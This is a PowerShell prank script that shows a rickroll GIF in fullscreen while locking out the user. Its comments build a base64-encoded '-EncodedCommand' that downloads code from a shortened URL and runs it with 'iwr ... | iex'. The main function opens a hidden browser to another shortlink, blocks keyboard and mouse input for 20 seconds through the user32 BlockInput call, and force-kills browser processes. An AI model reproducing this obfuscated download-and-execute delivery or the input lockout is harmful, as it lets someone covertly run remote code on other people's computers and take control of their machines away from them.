# $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('iwr "https://tinyurl.com/jsehbjb" -UseBasicParsing|iex'))
# powershell.exe -EncodedCommand "aQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHUAcgBsAC4AYwBvAG0ALwBqAHMAZQBoAGIAagBiACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAHwAaQBlAHgA"

$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    Start-Sleep $seconds
    $userInput::BlockInput($false)
}


#Disable-UserInput -seconds 10 | Out-Null

function Rick-Roll {
	[CmdletBinding()]
	param (
	)
	
	begin {

	}
	
	process {
		$ie = New-Object -ComObject InternetExplorer.Application
		$ie.Navigate("https://tinyurl.com/6dlylhn")

		$ie2 = New-Object -ComObject InternetExplorer.Application
		$ie2.visible = $true
		$ie2.fullscreen = $true
		$ie2.navigate("http://giphy.com/gifs/pandawhale-rickroll-pandawhalegif-szpY5c63cmzOE/fullscreen")
		Disable-UserInput -seconds 20 | Out-Null
		Get-Process -Name ie* | stop-process -Force
	}
	
	end {
	}
}

Rick-Roll